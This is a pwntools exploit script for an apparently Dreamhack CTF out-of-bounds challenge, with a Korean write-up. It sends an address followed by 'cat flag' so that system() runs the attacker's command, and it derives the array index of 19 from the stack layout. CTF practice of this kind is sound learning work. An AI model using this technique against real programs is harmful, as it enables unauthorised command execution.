#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 14856)

target = 0x0804a0b0
command = b"cat flag"
idx = 19

payload = pwn.p32(target)
payload += command

p.send(payload)
p.interactive()

"""
OOB(out-of-bound) 공격에 대한 이해는 쉽게할 수 있었다. 주어진 코드 자체도 크게 어렵지 않아서 assembly를 통해서 전부 분석이 가능하였다.
그러나 발견된 취약점을 이용하는데 어려움을 겪었는데, system 함수의 경우 문자열 자체를 인수로 사용하는 것이 아닌 해당 문자열의 주소를 인자로 사용하기 때문에 아래와 같은 형식으로 payload를 구성해야했다.

<문자열의 주소><사용할 문자열>

사실 취약점을 찾는 것은 stack을 확인해보면 command 변수보다 상위 주소에 name 변수가 시작하는 것을 확인할 수 있었고 떨어진 거리를 4Byte 당 1 index로 계산해서 19라는 값을 얻을 수 있었다.
"""
